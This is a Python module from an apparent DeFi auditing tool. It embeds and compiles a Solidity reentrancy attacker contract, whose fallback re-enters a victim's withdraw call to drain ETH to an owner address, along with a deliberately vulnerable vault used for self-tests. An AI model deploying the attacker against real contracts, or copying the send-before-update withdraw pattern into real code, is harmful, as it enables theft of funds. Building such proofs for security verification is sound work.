"""Attacker/victim contracts for one-block exploit chain replay.

The fork verifier used to prove reentrancy by calling a payout function
once from an EOA ("withdraw() mined"). That shows the window is open but
not that an attacker can actually DRAIN the contract. A real tool deploys
an attacker contract whose fallback re-enters the victim, fires the chain
inside a single block, and reads the resulting state diff.

Both contracts are embedded as Solidity source and compiled ONCE per
process via solc (cached in a module global + on disk). If solc is not
available the drain proof reports "attacker compile unavailable" instead
of guessing.
"""
import os
import shutil
import subprocess
from pathlib import Path
from typing import Dict, List, Optional

REENTRANCY_ATTACKER = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @dev Attacker used by the fork prover. go() seeds a deposit into the
/// victim, then triggers the payout selector; the fallback re-enters the
/// victim while the victim's balance is still recorded as unspent — the
/// CEI violation that lets one deposit drain many withdrawals.
contract ReentrancyAttacker {
    address payable public victim;
    address public owner;
    bytes public payload;          // payout calldata, e.g. withdraw(1)
    uint256 public reentries;

    /// @dev Cap the loop: unlimited re-entry exhausts the EVM stack and the
    /// whole tx reverts (rolling back ALL evidence). 100 provable re-entries
    /// from a single deposit is a convincing drain without killing the tx.
    uint256 public constant MAX_REENTRIES = 100;

    constructor(address payable _victim, address _owner, bytes memory _payload) {
        victim = _victim;
        owner = _owner;
        payload = _payload;
    }

    function depositIntoVictim() external payable {
        (bool ok, ) = victim.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
        require(ok, "deposit failed");
    }

    function go() external payable {
        (bool ok, ) = victim.call(payload);
        require(ok, "initial call failed");
        (bool s, ) = owner.call{value: address(this).balance}("");
        require(s);
    }

    function collect() external payable {
        (bool s, ) = owner.call{value: address(this).balance}("");
        require(s);
    }

    fallback() external payable {
        // The victim's payout is a plain ETH transfer (empty calldata). With
        // no receive() defined, those transfers land HERE — which is exactly
        // the reentry hook we need.
        if (reentries >= MAX_REENTRIES) return;
        reentries++;
        if (address(victim).balance > 0) {
            (bool ok, ) = victim.call(payload);
            require(ok, "reentry failed");
        }
    }
}
"""

SIMPLE_VAULT = """// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/// @dev Deliberately vulnerable demo victim (CEI violation): withdraw()
/// sends ETH BEFORE zeroing the balance. Used by the offline self-test to
/// prove the drain machinery end-to-end without any mainnet RPC.
contract SimpleVault {
    mapping(address => uint256) public balances;
    address public owner;

    constructor() { owner = msg.sender; }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(balances[msg.sender] >= amount, "insufficient");
        (bool ok, ) = msg.sender.call{value: amount}("");
        require(ok, "send failed");
        balances[msg.sender] -= amount;   // CEI VIOLATION — state after send
    }

    function totalBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
"""

SOURCES = {
    "ReentrancyAttacker": REENTRANCY_ATTACKER,
    "SimpleVault": SIMPLE_VAULT,
}

_cache_dir = Path(os.getenv("XDG_CACHE_HOME", "~/.cache")).expanduser() / "defihunter" / "compiled"
_compiled: Dict[str, Dict] = {}


def _find_solc() -> Optional[str]:
    for cand in (shutil.which("solc"), shutil.which("forge"),
                 "/home/asad/.local/bin/solc", "/home/asad/.foundry/bin/solc"):
        if cand:
            return cand
    return None


def _compile_with_forge(src: str) -> str:
    """Compile via forge (bundled solc) — write a tiny project and run
    `forge build --contracts` style. Slower; only used when plain solc is
    missing but forge exists."""
    import tempfile
    with tempfile.TemporaryDirectory(prefix="defihunter-attacker-") as td:
        root = Path(td)
        (root / "src").mkdir()
        (root / "src" / "A.sol").write_text(src)
        (root / "foundry.toml").write_text("[profile.default]\nsrc = 'src'\n")
        proc = subprocess.run(
            ["forge", "build", "--root", str(root), "--skip", "test", "--silent"],
            capture_output=True, text=True, timeout=180,
        )
        if proc.returncode != 0:
            raise RuntimeError(f"forge build failed: {proc.stderr[:300]}")
        artifact = root / "out" / "A.sol" / "A.json"
        import json
        data = json.loads(artifact.read_text())
        return data["bytecode"]["object"]


def compile_source(src: str, contract_name: str = "A") -> Dict:
    """Compile embedded Solidity → {bytecode, abi}. Cached per (source, name).
    Returns {} when no compiler is available (caller reports honestly)."""
    import hashlib
    key = f"{contract_name}:{hashlib.sha256(src.encode()).hexdigest()[:16]}"
    if key in _compiled:
        return _compiled[key]

    tool = _find_solc()
    if tool is None:
        return {}

    cache_file = _cache_dir / f"{contract_name}.json"
    if cache_file.exists():
        try:
            import json
            data = json.loads(cache_file.read_text())
            if data.get("src") == src:
                _compiled[key] = data["artifact"]
                return _compiled[key]
        except Exception:
            pass

    artifact: Dict = {}
    try:
        import json
        if "forge" in tool:
            bytecode = _compile_with_forge(src)
            artifact = {"bytecode": bytecode, "abi": []}
        else:
            src_path = _cache_dir / f"{contract_name}.sol"
            _cache_dir.mkdir(parents=True, exist_ok=True)
            src_path.write_text(src)
            proc = subprocess.run(
                ["solc", "--combined-json", "abi,bin", str(src_path)],
                capture_output=True, text=True, timeout=120,
            )
            if proc.returncode != 0:
                raise RuntimeError(f"solc failed: {proc.stderr[:300]}")
            data = json.loads(proc.stdout)
            # combined-json keys look like "<file>:<Contract>"
            for ckey, cval in data.get("contracts", {}).items():
                artifact = {"bytecode": cval.get("bin", ""),
                            "abi": cval.get("abi", [])}
                break
        if artifact.get("bytecode"):
            _compiled[key] = artifact
            try:
                cache_file.parent.mkdir(parents=True, exist_ok=True)
                cache_file.write_text(json.dumps({"src": src, "artifact": artifact}))
            except Exception:
                pass
    except Exception:
        artifact = {}
    return artifact


def get_contract(name: str) -> Dict:
    """{bytecode, abi} for one embedded contract, or {} if no compiler."""
    if name not in SOURCES:
        return {}
    return compile_source(SOURCES[name], contract_name=name)


def available() -> bool:
    return bool(_find_solc())
